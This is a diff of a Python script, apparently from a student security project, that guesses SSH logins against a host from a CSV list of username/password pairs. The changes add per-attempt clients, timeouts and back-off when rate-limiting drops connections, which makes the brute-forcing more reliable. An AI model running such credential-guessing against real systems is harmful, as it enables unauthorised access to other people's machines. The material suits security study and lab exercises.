@@ -5,8 +5,10 @@ Projet
 """
 
 import csv
+import time
 import paramiko
 import requests
+
 from requests.auth import HTTPBasicAuth
 
 def ssh_connect_single(hostname, username, password):
@@ -41,44 +43,51 @@ def ssh_connect_single(hostname, username, password):
 def ssh_connect_multiple(hostname, filename):
     """
     Connects to a machine via SSH reading a CSV file of username/password pairs.
+    Cree un nouveau client a chaque essai et gere proprement les deconnexions.
     """
-    # Create an SSH client
-    ssh_client = paramiko.SSHClient()
-    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     try:
         with open(filename, 'r', newline='', encoding='utf-8') as csvfile:
             csv_reader = csv.reader(csvfile)
-            
+
             for row in csv_reader:
-                # Vérifie que la ligne contient bien login et mot de passe
                 if len(row) == 2:
                     username = row[0]
                     password = row[1]
-                    
+
+                    ssh_client = paramiko.SSHClient()
+                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
                     try:
                         ssh_client.connect(
-    hostname, 
-    username=username, 
-    password=password, 
-    disabled_algorithms={'pubkeys': []}, # Autorise les vieilles clés (comme ssh-rsa)
-    look_for_keys=False,                 # Ne cherche pas de clés locales (accélère le processus)
-    allow_agent=False                    # N'utilise pas l'agent SSH de ton PC
-)
+                            hostname,
+                            username=username,
+                            password=password,
+                            disabled_algorithms={'pubkeys': []},
+                            look_for_keys=False,
+                            allow_agent=False,
+                            timeout=5
+                        )
                         print(f"[+] Connection successful with {username}/{password}")
                         ssh_client.close()
-                        return True  # Stop if a connection is successful
+                        return True
                     except paramiko.AuthenticationException:
                         print(f"[-] Authentication failed with {username}/{password}")
+                    except (paramiko.SSHException, ConnectionResetError, EOFError, OSError):
+                        print(f"[-] Connection refused by server for {username}/{password} (rate-limit). Waiting...")
+                        time.sleep(3)
                     except Exception as e:
                         print(f"[-] Error during connection with {username}/{password}: {e}")
+                    finally:
+                        ssh_client.close()
+
+                    time.sleep(1)
                 else:
                     print(f"[*] Ignored malformed line: {row}")
-                    
+
     except FileNotFoundError:
         print(f"[-] Error: The file '{filename}' was not found.")
 
-    return False  # Return False if no pair succeeded
+    return False
 
 
 def http_connect_single(url, username, password):
@@ -134,9 +143,23 @@ def http_connect_multiple(url, filename):
 
 def add_line_csv_authen(filename, line):
     """
-    Adds a new line to a CSV file.
+    Adds a new line to a CSV file, ensuring it starts on a new line.
     """
-    # Open the CSV file in append mode and write the new line
-    with open(filename, 'a', newline='') as csvfile:
+    # Verifie si le fichier se termine deja par un saut de ligne
+    needs_newline = False
+    try:
+        with open(filename, 'rb') as f:
+            f.seek(0, 2)  # Va a la fin du fichier
+            if f.tell() > 0:           # Fichier non vide
+                f.seek(-1, 2)          # Dernier octet
+                last_char = f.read(1)
+                if last_char not in (b'\n', b'\r'):
+                    needs_newline = True
+    except FileNotFoundError:
+        pass  # Le fichier sera cree
+
+    with open(filename, 'a', newline='', encoding='utf-8') as csvfile:
+        if needs_newline:
+            csvfile.write('\n')
         writer = csv.writer(csvfile)
         writer.writerow(line)
